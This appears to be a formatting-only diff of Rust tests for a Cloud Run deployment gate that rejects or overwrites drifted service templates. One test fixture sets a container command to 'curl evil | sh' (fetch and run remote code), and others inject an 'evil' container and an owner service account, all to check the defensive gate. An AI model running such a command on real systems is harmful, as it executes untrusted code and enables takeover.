@@ -158,7 +158,10 @@ pub fn check_read_back(spec: &FunctionSpec, service: &Value) -> Result<()> {
 
     let text = |value: &Value| value.as_str().unwrap_or_default().to_string();
     if container["image"].as_str() != Some(spec.image_uri.as_str()) {
-        return Err(mismatch(format!("it runs image {}", text(&container["image"]))));
+        return Err(mismatch(format!(
+            "it runs image {}",
+            text(&container["image"])
+        )));
     }
     if template["serviceAccount"].as_str() != Some(spec.run_as.as_str()) {
         return Err(mismatch(format!(
@@ -227,7 +230,10 @@ mod tests {
     /// A service as Cloud Run returns it once the gate's body is applied.
     fn service(spec: &FunctionSpec) -> Value {
         let mut service = service_body(spec);
-        service["name"] = json!(format!("projects/p/locations/us-central1/services/{}", spec.name));
+        service["name"] = json!(format!(
+            "projects/p/locations/us-central1/services/{}",
+            spec.name
+        ));
         service["reconciling"] = json!(false);
         let template = &mut service["template"];
         template["scaling"] = json!({"maxInstanceCount": 100});
@@ -257,8 +263,10 @@ mod tests {
                 .expect_err("must not match")
                 .to_string()
         };
-        assert!(reason(&|s| s["template"]["containers"][0]["env"][0]["value"] = json!("attacker"))
-            .contains("env differs"));
+        assert!(
+            reason(&|s| s["template"]["containers"][0]["env"][0]["value"] = json!("attacker"))
+                .contains("env differs")
+        );
         assert!(reason(&|s| s["template"]["containers"][0]["env"]
             .as_array_mut()
             .unwrap()
@@ -267,17 +275,23 @@ mod tests {
         assert!(reason(&|s| s["template"]["containers"][0]["env"][0] =
             json!({"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x"}}}))
         .contains("read from a secret"));
-        assert!(reason(&|s| s["template"]["serviceAccount"] = json!("owner@p.iam.gserviceaccount.com"))
-            .contains("runs as"));
-        assert!(reason(&|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"]))
-            .contains("sets command"));
+        assert!(reason(
+            &|s| s["template"]["serviceAccount"] = json!("owner@p.iam.gserviceaccount.com")
+        )
+        .contains("runs as"));
+        assert!(
+            reason(&|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"]))
+                .contains("sets command")
+        );
         assert!(reason(&|s| s["template"]["containers"]
             .as_array_mut()
             .unwrap()
             .push(json!({"image": "evil"})))
         .contains("2 containers"));
-        assert!(reason(&|s| s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]))
-            .contains("volumes"));
+        assert!(reason(
+            &|s| s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}])
+        )
+        .contains("volumes"));
     }
 
     #[test]
@@ -285,7 +299,10 @@ mod tests {
         let mut service = service(&spec());
         service["template"]["containers"][0]["sidecarMagic"] = json!({"enabled": true});
         let error = check_read_back(&spec(), &service).unwrap_err().to_string();
-        assert!(error.contains("sidecarMagic, which the gate doesn't know"), "{error}");
+        assert!(
+            error.contains("sidecarMagic, which the gate doesn't know"),
+            "{error}"
+        );
     }
 
     struct FakeRun {
@@ -307,7 +324,8 @@ mod tests {
     #[tokio::test]
     async fn apply_replaces_the_whole_template() {
         let mut drifted = service(&spec());
-        drifted["template"]["containers"][0]["command"] = json!(["/bin/sh", "-c", "curl evil | sh"]);
+        drifted["template"]["containers"][0]["command"] =
+            json!(["/bin/sh", "-c", "curl evil | sh"]);
         drifted["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]);
         let run = FakeRun {
             service: Mutex::new(drifted),
